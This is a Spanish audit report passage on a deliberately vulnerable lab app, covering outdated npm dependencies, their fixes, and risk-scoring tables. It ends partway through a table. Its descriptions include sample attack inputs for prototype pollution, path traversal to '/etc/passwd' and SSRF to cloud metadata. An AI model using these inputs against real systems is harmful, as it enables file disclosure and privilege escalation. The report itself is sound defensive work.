# INFORME TÉCNICO DE AUDITORÍA DE SEGURIDAD
## CarteraPro Risk Lab — Parte 2: Secciones 6 a 9 y Conclusiones

---

| Campo               | Detalle                                                              |
|---------------------|----------------------------------------------------------------------|
| **Documento**       | Informe Técnico de Auditoría de Seguridad — Parte 2                 |
| **Aplicación**      | CarteraPro Risk Lab                                                  |
| **Versión revisada**| 1.0 (entorno de laboratorio)                                         |
| **Fecha de emisión**| 2026-06-13                                                           |
| **Clasificación**   | CONFIDENCIAL — Uso interno restringido                               |
| **Equipo auditor**  | Equipo de Auditoría Técnica — Tendencias en Ingeniería de Software   |

---

> **Aviso de confidencialidad:** Este documento contiene información sensible sobre vulnerabilidades de seguridad identificadas en la aplicación CarteraPro Risk Lab. Su distribución debe limitarse estrictamente al personal autorizado. La divulgación no autorizada puede comprometer la seguridad de la organización.

---

## TABLA DE CONTENIDOS

6. [Hallazgos de Dependencias](#6-hallazgos-de-dependencias)
7. [Valoración de Riesgos](#7-valoración-de-riesgos)
8. [Correlación de Hallazgos](#8-correlación-de-hallazgos)
9. [Anexo de Evidencias Técnicas](#9-anexo-de-evidencias-técnicas)

[Conclusiones Generales](#conclusiones-generales)

---

---

# 6. HALLAZGOS DE DEPENDENCIAS

## 6.1 Contexto del Análisis de Dependencias

El análisis de dependencias de terceros es un componente esencial de cualquier auditoría de seguridad moderna. Las aplicaciones actuales dependen en gran medida de ecosistemas de paquetes externos; en el ecosistema Node.js/npm, la superficie de ataque derivada de dependencias directas e indirectas puede superar con creces la del código propio de la aplicación.

Para este análisis se utilizó la herramienta **`npm audit`** sobre el directorio del backend (`vulnerable-cartera-backend`), complementada con revisión manual de los archivos `package.json` de ambos componentes.

| Componente   | Gestor de paquetes | Comando ejecutado          | Total vulnerabilidades |
|--------------|--------------------|----------------------------|------------------------|
| Backend      | npm                | `npm audit --json`         | 25 vulnerabilidades    |
| Frontend     | npm                | `npm audit --json`         | Vulnerabilidades compartidas (axios, lodash) |

Las dependencias directas del backend son las siguientes:

```json
{
  "axios": "0.21.1",
  "body-parser": "1.19.0",
  "cors": "2.8.5",
  "dotenv": "8.2.0",
  "express": "4.17.1",
  "jsonwebtoken": "8.5.1",
  "lodash": "4.17.20",
  "moment": "2.29.1",
  "multer": "1.4.4-lts.1",
  "request": "2.88.2",
  "sqlite3": "5.0.2"
}
```

> **Observación crítica:** El conjunto de dependencias directas del backend presenta un patrón preocupante: prácticamente **cada paquete de producción está desactualizado** y varios acumulan años de parches de seguridad no aplicados. Esto sugiere que la gestión de dependencias no forma parte del ciclo de vida de desarrollo del proyecto.

---

## 6.2 Resumen de Vulnerabilidades por Severidad

| Severidad  | Cantidad | Porcentaje |
|------------|----------|------------|
| Crítica    | 2        | 8 %        |
| Alta       | 18       | 72 %       |
| Moderada   | 3        | 12 %       |
| Baja       | 2        | 8 %        |
| **Total**  | **25**   | 100 %      |

---

## 6.3 Detalle de Hallazgos de Dependencias

---

### DEP-001 — `request` 2.88.2: Server-Side Request Forgery (SSRF) y Paquete Deprecado

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🔴 Crítica                                                               |
| **GHSA / CVE**   | GHSA-p8p7-x288-28g6                                                      |
| **Paquete**      | `request` 2.88.2                                                         |
| **Tipo**         | Dependencia directa                                                       |
| **Afecta**       | `backend/src/controllers/adminController.js` (transitivo)                |

**Descripción:**

El paquete `request` fue oficialmente marcado como **deprecado en febrero de 2020**. Su mantenimiento cesó por completo y no recibirá correcciones de seguridad. Adicionalmente, la versión 2.88.2 contiene una vulnerabilidad de **Server-Side Request Forgery (SSRF)** que permite a un atacante instruir al servidor para realizar peticiones HTTP arbitrarias a destinos que normalmente estarían fuera del alcance del atacante, incluyendo servicios internos de red y endpoints de metadatos de proveedores de nube (p. ej., `http://169.254.169.254/`).

**Riesgo:**

La explotación exitosa de SSRF puede derivar en exposición de credenciales de infraestructura cloud, acceso a servicios internos no expuestos públicamente, y movimiento lateral dentro de la red interna.

**Solución recomendada:**

Reemplazar completamente el uso de `request` por alternativas modernas y mantenidas:
- `node-fetch` >= 3.x (ESM nativo) o `node-fetch` 2.x para CommonJS
- `axios` >= 1.6.0 (actualizado desde DEP-003)

```bash
npm uninstall request
npm install node-fetch@2
```

---

### DEP-002 — `form-data`: Generación Insegura de Boundary Multipart

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🔴 Crítica                                                               |
| **GHSA / CVE**   | GHSA-fjgf-rcq5-mfq5                                                      |
| **Paquete**      | `form-data` (dependencia transitiva de `request`, `axios`)               |
| **Tipo**         | Dependencia transitiva                                                    |

**Descripción:**

Las versiones afectadas de `form-data` utilizan `Math.random()` para generar el *boundary* (delimitador) de formularios multipart. `Math.random()` **no es criptográficamente seguro**: es predecible con un número suficiente de observaciones. Un atacante que pueda predecir el valor del boundary puede inyectar contenido arbitrario en cargas multipart, lo que puede derivar en omisión de validaciones, envenenamiento de datos y potencialmente ejecución de código en el servidor receptor.

**Solución recomendada:**

```bash
npm install form-data@4.0.1
```

La versión >= 4.0.1 utiliza `crypto.randomBytes()` para la generación del boundary, que sí cumple con los requisitos de aleatoriedad criptográfica.

---

### DEP-003 — `axios` 0.21.1: Cross-Site Request Forgery (CSRF)

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta                                                                  |
| **CVE**          | CVE-2023-45857                                                           |
| **Paquete**      | `axios` 0.21.1                                                           |
| **Tipo**         | Dependencia directa (backend y frontend)                                 |

**Descripción:**

La versión 0.21.1 de axios, presente tanto en el backend como en el frontend, contiene una vulnerabilidad de **Cross-Site Request Forgery (CSRF)**. En esta versión, la cabecera `X-XSRF-TOKEN` puede ser expuesta involuntariamente a un host de terceros durante una redirección, filtrando el token de sesión del usuario a un dominio controlado por el atacante. El vector es especialmente grave en el contexto del frontend, donde las sesiones de usuario se gestionan mediante tokens almacenados en cookies o localStorage.

Adicionalmente, la versión 0.21.x tiene más de tres años de antigüedad y acumula numerosas correcciones de seguridad adicionales lanzadas en versiones posteriores.

**Solución recomendada:**

```bash
# Backend
npm install axios@^1.7.0

# Frontend
npm install axios@^1.7.0
```

---

### DEP-004 — `express` 4.17.1: XSS en `response.redirect()`

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta                                                                  |
| **GHSA / CVE**   | GHSA-qw6h-vgh9-j6wx                                                      |
| **Paquete**      | `express` 4.17.1                                                         |
| **Tipo**         | Dependencia directa (framework principal)                                |

**Descripción:**

Express 4.17.1 es vulnerable a **Cross-Site Scripting (XSS)** cuando se invoca `response.redirect()` con una URL controlada por el usuario. El framework genera una página HTML de respuesta de redirección sin escapar correctamente el valor de la URL, lo que permite inyectar HTML/JavaScript arbitrario en el cuerpo de la respuesta. El impacto es directamente proporcional al número de rutas que acepten URLs de redirección como parámetro de entrada.

**Solución recomendada:**

```bash
npm install express@^4.21.0
```

La versión >= 4.19.2 corrige esta vulnerabilidad. Se recomienda la 4.21.x como versión estable más reciente de la rama 4.x.

---

### DEP-005 — `jsonwebtoken` 8.5.1: Uso de Claves de Tipo No Restringido

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta                                                                  |
| **CVE**          | CVE-2022-23529                                                           |
| **Paquete**      | `jsonwebtoken` 8.5.1                                                     |
| **Tipo**         | Dependencia directa                                                       |

**Descripción:**

La versión 8.5.1 de `jsonwebtoken` no impone restricciones sobre el tipo de objeto utilizado como clave secreta en la función `verify()`. Un atacante con capacidad de influir en la clave de verificación (p. ej., mediante inyección de configuración) puede pasar un objeto manipulado que sea aceptado como clave válida, derivando en la aceptación de tokens JWT falsificados y, por consiguiente, en omisión de autenticación completa.

> **Nota de ironía técnica:** Como se documenta en el hallazgo SEC-003 de la Parte 1 de este informe, la aplicación **no implementa verificación JWT real**: utiliza un esquema de tokens propietarios inseguros basados en separadores. Por tanto, esta vulnerabilidad en `jsonwebtoken` no tiene impacto directo en la lógica actual, pero la presencia de la dependencia vulnerable en el `package.json` implica que cualquier refactorización que introduzca JWT real podría heredar esta vulnerabilidad de forma inadvertida.

**Solución recomendada:**

```bash
npm install jsonwebtoken@^9.0.2
```

---

### DEP-006 — `lodash` 4.17.20: Inyección de Comandos

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta                                                                  |
| **CVE**          | CVE-2021-23337                                                           |
| **Paquete**      | `lodash` 4.17.20                                                         |
| **Tipo**         | Dependencia directa (backend y frontend)                                 |

**Descripción:**

La función `lodash.template()` en versiones anteriores a 4.17.21 es vulnerable a **inyección de comandos** cuando se pasan como opciones objetos controlados por el usuario. Específicamente, la opción `sourceURL` no es correctamente validada, permitiendo que un atacante inyecte código Node.js arbitrario en el contexto de ejecución de la plantilla. Si la aplicación utiliza `_.template()` con datos de entrada del usuario, la explotación puede derivar en RCE.

**Solución recomendada:**

```bash
# Backend y Frontend
npm install lodash@^4.17.21
```

La corrección es mínima (de 4.17.20 a 4.17.21) y no introduce cambios de API incompatibles.

---

### DEP-007 — `moment` 2.29.1: Path Traversal y Estado Legacy

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta                                                                  |
| **CVE**          | CVE-2022-24785                                                           |
| **Paquete**      | `moment` 2.29.1                                                          |
| **Tipo**         | Dependencia directa                                                       |

**Descripción:**

La función `moment.locale()` en versiones anteriores a 2.29.2 es vulnerable a **path traversal** cuando se le pasa una cadena de localización controlada por el usuario. Un atacante puede suministrar una cadena como `../../etc/passwd` que `moment` intentará resolver como ruta de archivo de localización, pudiendo leer archivos arbitrarios del sistema de archivos del servidor.

Adicionalmente, el equipo de `moment.js` declaró oficialmente el proyecto en **modo legacy en 2020**, recomendando a nuevos proyectos migrar a alternativas modernas. No se publicarán nuevas funcionalidades y el soporte de seguridad es limitado.

**Solución recomendada:**

Migrar a una librería de fechas moderna:
- **`date-fns`** >= 3.x: API funcional, tree-shakeable, sin efectos secundarios.
- **`Day.js`** >= 1.x: API compatible con moment, < 2 KB.

```bash
npm uninstall moment
npm install date-fns@^3.6.0
```

---

### DEP-008 — `multer` 1.4.4-lts.1: Denegación de Servicio

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta                                                                  |
| **GHSA / CVE**   | GHSA-wm7h-9275-46v2                                                      |
| **Paquete**      | `multer` 1.4.4-lts.1                                                     |
| **Tipo**         | Dependencia directa                                                       |

**Descripción:**

La versión 1.4.4-lts.1 de `multer` es vulnerable a **Denegación de Servicio (DoS)** mediante solicitudes multipart maliciosamente construidas. Un atacante puede enviar una petición con un cuerpo multipart especialmente formateado que provoca un consumo excesivo de CPU y/o memoria en el servidor durante el procesamiento, degradando la disponibilidad del servicio para usuarios legítimos. El vector es especialmente crítico en endpoints públicos de subida de archivos.

**Solución recomendada:**

```bash
npm install multer@^1.4.5-lts.1
```

---

### DEP-009 — `body-parser` 1.19.0: Denegación de Servicio con URL Encoding

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta                                                                  |
| **GHSA / CVE**   | GHSA-qwcr-r2fm-qrc7                                                      |
| **Paquete**      | `body-parser` 1.19.0                                                     |
| **Tipo**         | Dependencia directa                                                       |

**Descripción:**

Cuando la opción `urlencoded: { extended: true }` está habilitada, versiones anteriores a 1.20.3 de `body-parser` son vulnerables a **DoS** mediante la inyección de cargas útiles extremadamente grandes o anidadas en el cuerpo de la solicitud. La librería no impone límites adecuados durante el proceso de análisis, lo que puede derivar en consumo excesivo de memoria y degradación del rendimiento del servidor.

**Solución recomendada:**

```bash
npm install body-parser@^1.20.3
```

Adicionalmente, verificar que el límite de tamaño de cuerpo esté configurado explícitamente:
```js
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true, limit: '1mb' }));
```

---

### DEP-010 — `sqlite3` 5.0.2: DoS por Parámetros Inválidos

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta                                                                  |
| **GHSA / CVE**   | GHSA-jqv5-whv4-4765                                                      |
| **Paquete**      | `sqlite3` 5.0.2                                                          |
| **Tipo**         | Dependencia directa                                                       |

**Descripción:**

La versión 5.0.2 de `sqlite3` es vulnerable a **Denegación de Servicio** cuando se intentan enlazar parámetros de tipo inválido en una sentencia preparada. Un atacante que pueda influir en los valores de los parámetros de una consulta puede provocar el bloqueo del proceso Node.js o un error no manejado que detenga el servidor.

**Solución recomendada:**

```bash
npm install sqlite3@^5.1.7
```

---

### DEP-011 — `path-to-regexp`: ReDoS por Backtracking Catastrófico

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta (transitiva por Express)                                         |
| **GHSA / CVE**   | GHSA-9wv6-86v2-598j                                                      |
| **Paquete**      | `path-to-regexp` (dependencia transitiva de `express`)                   |
| **Tipo**         | Dependencia transitiva                                                    |

**Descripción:**

Las versiones antiguas de `path-to-regexp` —usadas internamente por Express para el enrutamiento— generan expresiones regulares con **backtracking catastrófico**. Este patrón conocido como **ReDoS (Regular Expression Denial of Service)** permite a un atacante enviar rutas URL especialmente construidas que hacen que el motor de expresiones regulares ejecute en tiempo exponencial, bloqueando el event loop de Node.js y dejando el servidor inresponsivo para todos los usuarios.

**Solución recomendada:**

La corrección se obtiene actualizando Express a una versión que incluya `path-to-regexp` >= 0.1.10 o >= 8.x según la rama:

```bash
npm install express@^4.21.0
```

---

### DEP-012 — `qs`: Prototype Pollution

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta (transitiva por `body-parser` / Express)                        |
| **CVE**          | CVE-2022-24999                                                           |
| **Paquete**      | `qs` (dependencia transitiva)                                            |
| **Tipo**         | Dependencia transitiva                                                    |

**Descripción:**

La librería `qs`, utilizada por `body-parser` y Express para el análisis de query strings, es vulnerable a **Prototype Pollution** en versiones anteriores a 6.11.0. Un atacante puede enviar un query string como `?__proto__[admin]=true` que modifica el prototipo de `Object` en el contexto de ejecución de Node.js, pudiendo alterar el comportamiento de cualquier objeto JavaScript en la aplicación y potencialmente escalar a RCE o bypass de autenticación dependiendo de cómo se utilicen los objetos resultantes.

**Solución recomendada:**

La corrección se obtiene actualizando las dependencias padre:

```bash
npm install express@^4.21.0 body-parser@^1.20.3
```

---

### DEP-013 — `dotenv` 8.2.0: Versión Obsoleta

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟡 Baja                                                                  |
| **CVE**          | N/A                                                                      |
| **Paquete**      | `dotenv` 8.2.0                                                           |
| **Tipo**         | Dependencia directa                                                       |

**Descripción:**

La versión 8.2.x de `dotenv` es funcional pero se encuentra muy por detrás de la versión actual (16.x). Las versiones intermedias introdujeron correcciones de compatibilidad con Node.js moderno, soporte para archivos `.env.local`, expansión de variables, y diversas mejoras de rendimiento y ergonomía. Si bien no se conoce un CVE activo, la versión 8.x puede presentar comportamientos inesperados con versiones de Node.js >= 18 y no recibe actualizaciones de seguridad.

**Solución recomendada:**

```bash
npm install dotenv@^16.4.5
```

---

### DEP-014 — `eslint` 7.32.0: Fin de Vida (EOL)

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟡 Baja                                                                  |
| **CVE**          | N/A                                                                      |
| **Paquete**      | `eslint` 7.32.0                                                          |
| **Tipo**         | Dependencia de desarrollo                                                 |

**Descripción:**

ESLint 7.x alcanzó su fin de vida (EOL) y no recibe actualizaciones de seguridad. La versión actual es 9.x, que introduce la nueva arquitectura de configuración plana (`eslint.config.js`). Utilizar ESLint obsoleto implica que las reglas de análisis estático para detección de vulnerabilidades de seguridad (p. ej., `eslint-plugin-security`) no cubren patrones de vulnerabilidad descubiertos en los últimos años.

**Solución recomendada:**

```bash
npm install --save-dev eslint@^9.x
```

Nota: la migración de ESLint 7 a 9 requiere actualizar el archivo de configuración al nuevo formato plano.

---

### DEP-015 — `vite` 5.0.0 (Frontend): Path Traversal en Modo Desarrollo

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta                                                                  |
| **GHSA / CVE**   | GHSA-vg6x-rcgg-rjx6 / GHSA-4vvj-4cpr-p986                              |
| **Paquete**      | `vite` 5.0.0                                                             |
| **Tipo**         | Dependencia directa (frontend, herramienta de build/desarrollo)          |

**Descripción:**

Vite 5.0.0 contiene vulnerabilidades de **path traversal** en su servidor de desarrollo (`vite dev`). Un atacante con acceso a la red del servidor de desarrollo puede solicitar rutas con secuencias como `/@fs/etc/passwd` para acceder a archivos arbitrarios del sistema de archivos del host, ignorando las restricciones configuradas en `server.fs.allow`. Si bien el servidor de desarrollo no debería estar expuesto en producción, en entornos de CI/CD o durante pruebas de integración en redes compartidas, el riesgo es real y explotable.

**Solución recomendada:**

```bash
npm install vite@^5.4.14
# o migrar a la rama estable 6.x
npm install vite@^6.3.0
```

---

## 6.4 Resumen de Hallazgos de Dependencias

| ID      | Paquete                | Versión Actual    | Severidad  | CVE / GHSA              | Solución                         |
|---------|------------------------|-------------------|------------|-------------------------|----------------------------------|
| DEP-001 | `request`              | 2.88.2            | 🔴 Crítica | GHSA-p8p7-x288-28g6     | Migrar a `node-fetch` o `axios`  |
| DEP-002 | `form-data`            | < 4.0.1           | 🔴 Crítica | GHSA-fjgf-rcq5-mfq5     | Actualizar a >= 4.0.1            |
| DEP-003 | `axios`                | 0.21.1            | 🟠 Alta    | CVE-2023-45857          | Actualizar a >= 1.7.0            |
| DEP-004 | `express`              | 4.17.1            | 🟠 Alta    | GHSA-qw6h-vgh9-j6wx     | Actualizar a >= 4.21.0           |
| DEP-005 | `jsonwebtoken`         | 8.5.1             | 🟠 Alta    | CVE-2022-23529          | Actualizar a >= 9.0.2            |
| DEP-006 | `lodash`               | 4.17.20           | 🟠 Alta    | CVE-2021-23337          | Actualizar a >= 4.17.21          |
| DEP-007 | `moment`               | 2.29.1            | 🟠 Alta    | CVE-2022-24785          | Migrar a `date-fns` 3.x          |
| DEP-008 | `multer`               | 1.4.4-lts.1       | 🟠 Alta    | GHSA-wm7h-9275-46v2     | Actualizar a >= 1.4.5-lts.1      |
| DEP-009 | `body-parser`          | 1.19.0            | 🟠 Alta    | GHSA-qwcr-r2fm-qrc7     | Actualizar a >= 1.20.3           |
| DEP-010 | `sqlite3`              | 5.0.2             | 🟠 Alta    | GHSA-jqv5-whv4-4765     | Actualizar a >= 5.1.7            |
| DEP-011 | `path-to-regexp`       | < 0.1.10 (trans.) | 🟠 Alta    | GHSA-9wv6-86v2-598j     | Actualizar `express`             |
| DEP-012 | `qs`                   | < 6.11.0 (trans.) | 🟠 Alta    | CVE-2022-24999          | Actualizar `express`/`body-parser`|
| DEP-013 | `dotenv`               | 8.2.0             | 🟡 Baja    | N/A                     | Actualizar a >= 16.4.5           |
| DEP-014 | `eslint`               | 7.32.0            | 🟡 Baja    | N/A                     | Actualizar a >= 9.x              |
| DEP-015 | `vite`                 | 5.0.0             | 🟠 Alta    | GHSA-vg6x-rcgg-rjx6     | Actualizar a >= 5.4.14 o 6.x     |

---

---

# 7. VALORACIÓN DE RIESGOS

## 7.1 Metodología de Valoración

La valoración de riesgos aplica una matriz simplificada basada en los principios de **CVSS 3.1** (Common Vulnerability Scoring System), adaptada para facilitar la comunicación con equipos técnicos y de gestión. El nivel de riesgo se calcula como el producto de la probabilidad de explotación y el impacto potencial sobre la confidencialidad, integridad y disponibilidad del sistema.

### Escala de Probabilidad

| Valor | Descripción |
|-------|-------------|
| **3 — Alta** | El ataque es trivial, no requiere autenticación previa, no necesita condiciones especiales y existe exploit público conocido. |
| **2 — Media** | El ataque requiere cierto nivel de acceso, conocimiento técnico o la concurrencia de condiciones específicas. |
| **1 — Baja** | El ataque es complejo, requiere acceso privilegiado, condiciones muy específicas o se trata de una vulnerabilidad teórica. |

### Escala de Impacto

| Valor | Descripción |
|-------|-------------|
| **3 — Alto** | Compromiso total del sistema, exfiltración masiva de datos, interrupción completa del servicio, o impacto irreversible. |
| **2 — Medio** | Compromiso parcial, exfiltración limitada, degradación significativa del servicio o impacto reversible pero costoso. |
| **1 — Bajo** | Impacto menor, exposición de información no crítica, o degradación mínima del servicio. |

### Nivel de Riesgo

| Puntuación (P × I) | Clasificación |
|--------------------|---------------|
| 7 — 9              | 🔴 Crítico    |
| 4 — 6              | 🟠 Alto       |
| 3                  | 🟡 Medio      |
| 1 — 2              | 🟢 Bajo       |

---

## 7.2 Tabla Completa de Valoración de Riesgos

### 7.2.1 Hallazgos de Seguridad (SEC)

| ID       | Nombre del Hallazgo                              | P | I | P×I | Clasificación | Justificación breve                                                          |
|----------|--------------------------------------------------|---|---|-----|---------------|------------------------------------------------------------------------------|
| SEC-001  | Inyección SQL en múltiples endpoints             | 3 | 3 | 9   | 🔴 Crítico    | Sin parámetros enlazados; explotable con curl básico; impacto total sobre BD |
| SEC-002  | Subida de archivos sin restricción               | 3 | 3 | 9   | 🔴 Crítico    | Permite subir webshells; no valida tipo ni contenido; RCE directo            |
| SEC-003  | Autenticación completamente rota                 | 3 | 3 | 9   | 🔴 Crítico    | Token predecible; el rol lo suministra el atacante; sin firma criptográfica  |
| SEC-004  | RCE vía inyección de comandos (`exec`)           | 3 | 3 | 9   | 🔴 Crítico    | Endpoint público; `cmd` sin sanitizar; shell del servidor comprometible      |
| SEC-005  | RCE vía `eval()` sin restricciones              | 3 | 3 | 9   | 🔴 Crítico    | `eval` sobre input directo del usuario; acceso total al runtime Node.js      |
| SEC-006  | Control de acceso ausente (BOLA / BFLA)          | 3 | 3 | 9   | 🔴 Crítico    | Cualquier usuario accede a recursos de cualquier otro sin validación         |
| SEC-007  | Credenciales hardcodeadas en código fuente       | 3 | 3 | 9   | 🔴 Crítico    | Claves AWS, passwords, JWT en repositorio git; exposición permanente         |
| SEC-008  | Exposición de variables de entorno vía API       | 3 | 3 | 9   | 🔴 Crítico    | `process.env` completo en respuesta JSON; sin autenticación requerida        |
| SEC-009  | SSRF en endpoint de fetch administrativo         | 3 | 2 | 6   | 🟠 Alto       | Sin validación de destino; acceso a red interna y metadatos cloud            |
| SEC-010  | XSS almacenado en campo `notes` de clientes      | 3 | 2 | 6   | 🟠 Alto       | `dangerouslySetInnerHTML` sin DOMPurify; payload persiste en BD              |
| SEC-011  | Path traversal en lectura de archivos            | 3 | 2 | 6   | 🟠 Alto       | `path.join` sin restricción; lectura de `.env`, `/etc/passwd`                |
| SEC-012  | Auto-login por parámetro URL (`?zap=auto`)       | 3 | 3 | 9   | 🔴 Crítico    | Cualquier visitante obtiene sesión de admin; password en bundle JS           |
| SEC-013  | Contraseñas almacenadas en texto plano           | 3 | 3 | 9   | 🔴 Crítico    | Sin hashing; dump de BD expone todas las credenciales directamente           |
| SEC-014  | CORS configurado como wildcard (`*`)             | 2 | 2 | 4   | 🟠 Alto       | Permite peticiones cross-origin desde cualquier dominio malicioso            |
| SEC-015  | Headers HTTP informativos inseguros              | 2 | 1 | 2   | 🟢 Bajo       | Revela versión exacta de Express y hostname; facilita fingerprinting         |
| SEC-016  | Ausencia de rate limiting                        | 3 | 2 | 6   | 🟠 Alto       | Permite fuerza bruta y DoS en todos los endpoints; sin throttling            |
| SEC-017  | Logging excesivo de tokens en consola            | 2 | 2 | 4   | 🟠 Alto       | Tokens y datos sensibles en logs; riesgo si logs son accesibles              |
| SEC-018  | Sin cabeceras de seguridad HTTP (CSP, HSTS)      | 2 | 2 | 4   | 🟠 Alto       | Clickjacking, MIME sniffing y ataques de downgrade habilitados               |
| SEC-019  | Caché insegura (`Cache-Control: public`)         | 2 | 2 | 4   | 🟠 Alto       | Respuestas con datos sensibles pueden ser cacheadas en proxies               |
| SEC-020  | Verificación de token JWT sin firma real         | 3 | 3 | 9   | 🔴 Crítico    | El "token" es texto libre; cualquiera puede forjar identidad arbitraria      |
| SEC-021  | Directorio de uploads accesible públicamente     | 2 | 2 | 4   | 🟠 Alto       | Archivos subidos servidos sin control de acceso ni validación                |
| SEC-022  | Sin validación de tipo de contenido en uploads   | 3 | 2 | 6   | 🟠 Alto       | Acepta cualquier extensión y MIME type; facilita subida de payloads          |
| SEC-023  | Errores internos expuestos al cliente            | 2 | 1 | 2   | 🟢 Bajo       | Stack traces y mensajes de error en respuestas; facilita reconocimiento      |
| SEC-024  | Sin política de contraseñas                      | 2 | 2 | 4   | 🟠 Alto       | Contraseñas triviales aceptadas sin restricciones de longitud/complejidad    |
| SEC-025  | ReDoS en validaciones de entrada                 | 2 | 2 | 4   | 🟠 Alto       | Expresiones regulares con backtracking catastrófico en rutas                 |
| SEC-026  | Información de versiones en headers              | 1 | 1 | 1   | 🟢 Bajo       | `X-Powered-By` revela framework y versión; trivial de mitigar               |
| SEC-027  | Sin protección contra CSRF en API                | 2 | 2 | 4   | 🟠 Alto       | Sin tokens CSRF; SameSite no configurado en cookies                          |
| SEC-028  | Sesiones sin expiración configurada              | 2 | 2 | 4   | 🟠 Alto       | Tokens no expiran; riesgo de sesiones eternas tras compromiso                |

---

### 7.2.2 Hallazgos de Calidad de Software (CAL)

| ID       | Nombre del Hallazgo                              | P | I | P×I | Clasificación | Justificación breve                                                          |
|----------|--------------------------------------------------|---|---|-----|---------------|------------------------------------------------------------------------------|
| CAL-001  | Código duplicado masivo                          | 3 | 2 | 6   | 🟠 Alto       | Duplicación > 30 %; correcciones de seguridad deben aplicarse múltiples veces|
| CAL-002  | Complejidad ciclomática elevada                  | 2 | 2 | 4   | 🟠 Alto       | Funciones con CC > 15; alto riesgo de regresiones y difícil de auditar       |
| CAL-003  | Ausencia de tests unitarios                      | 3 | 2 | 6   | 🟠 Alto       | Sin cobertura de tests; vulnerabilidades no detectables en CI/CD             |
| CAL-004  | Variables globales mutables sin control          | 2 | 1 | 2   | 🟢 Bajo       | Estado global mutable; riesgo de condiciones de carrera en alta concurrencia |
| CAL-005  | `console.log` en código de producción            | 2 | 1 | 2   | 🟢 Bajo       | Filtración de datos sensibles en logs de producción                          |
| CAL-006  | Funciones con demasiados parámetros              | 1 | 1 | 1   | 🟢 Bajo       | Dificulta mantenimiento; riesgo de errores de orden de parámetros            |
| CAL-007  | Manejo de errores incorrecto (`swallow errors`)  | 2 | 2 | 4   | 🟠 Alto       | Errores silenciados ocultan fallos de seguridad y condiciones anómalas       |
| CAL-008  | SQL construido con concatenación de strings      | 3 | 3 | 9   | 🔴 Crítico    | Patrón arquitectural que genera SQLi; afecta múltiples archivos              |
| CAL-009  | Uso de `var` en lugar de `const`/`let`           | 1 | 1 | 1   | 🟢 Bajo       | Hoisting de variables; comportamiento inesperado en cierres                  |
| CAL-010  | Dependencias no utilizadas en `package.json`     | 1 | 1 | 1   | 🟢 Bajo       | Superficie de ataque innecesaria; aumenta el tamaño del bundle               |

---

### 7.2.3 Hallazgos de Dependencias (DEP)

| ID       | Nombre del Hallazgo                              | P | I | P×I | Clasificación | Justificación breve                                                          |
|----------|--------------------------------------------------|---|---|-----|---------------|------------------------------------------------------------------------------|
| DEP-001  | `request` 2.88.2 — SSRF / Deprecado             | 3 | 3 | 9   | 🔴 Crítico    | Paquete deprecado con CVE activo; SSRF con acceso a metadatos cloud          |
| DEP-002  | `form-data` — Boundary inseguro (`Math.random`) | 2 | 2 | 4   | 🟠 Alto       | Boundary predecible; inyección de contenido en multipart                     |
| DEP-003  | `axios` 0.21.1 — CSRF                            | 2 | 2 | 4   | 🟠 Alto       | Fuga de token CSRF en redirecciones; presente en backend y frontend          |
| DEP-004  | `express` 4.17.1 — XSS en redirect              | 2 | 2 | 4   | 🟠 Alto       | XSS en respuestas de redirección si URL controlada por usuario               |
| DEP-005  | `jsonwebtoken` 8.5.1 — Clave sin restricción     | 1 | 3 | 3   | 🟡 Medio      | No activo actualmente (app no usa JWT real), pero riesgo latente             |
| DEP-006  | `lodash` 4.17.20 — Command Injection             | 2 | 3 | 6   | 🟠 Alto       | Si `_.template()` recibe input de usuario; impacto de RCE potencial          |
| DEP-007  | `moment` 2.29.1 — Path Traversal + Legacy        | 2 | 2 | 4   | 🟠 Alto       | Path traversal en `locale()`; paquete sin soporte activo                     |
| DEP-008  | `multer` 1.4.4-lts.1 — DoS                       | 2 | 2 | 4   | 🟠 Alto       | Solicitudes maliciosas pueden colapsar el servidor de uploads                |
| DEP-009  | `body-parser` 1.19.0 — DoS                       | 2 | 2 | 4   | 🟠 Alto       | Payloads grandes o anidados causan consumo excesivo de memoria               |
| DEP-010  | `sqlite3` 5.0.2 — DoS                            | 2 | 2 | 4   | 🟠 Alto       | Parámetros inválidos pueden bloquear el proceso Node.js                      |
| DEP-011  | `path-to-regexp` — ReDoS                         | 2 | 2 | 4   | 🟠 Alto       | URLs especiales bloquean el event loop; transitiva por Express               |
| DEP-012  | `qs` — Prototype Pollution                       | 2 | 3 | 6   | 🟠 Alto       | Modifica `Object.prototype`; puede afectar toda la lógica de la aplicación   |
| DEP-013  | `dotenv` 8.2.0 — Obsoleto                        | 1 | 1 | 1   | 🟢 Bajo       | Sin CVE activo; riesgo de compatibilidad con Node.js moderno                 |
| DEP-014  | `eslint` 7.32.0 — EOL                            | 1 | 1 | 1   | 🟢 Bajo       | Herramienta de desarrollo; sin impacto directo en runtime                    |
| DEP-015  | `vite` 5.0.0 — Path Traversal                   | 2 | 2 | 4   | 🟠 Alto       | Lectura de archivos del host si el servidor dev está expuesto                |

---

## 7.3 Distribución del Riesgo

| Clasificación | Cantidad | Porcentaje |
|---------------|----------|------------|
| 🔴 Crítico    | 14       | 26 %       |
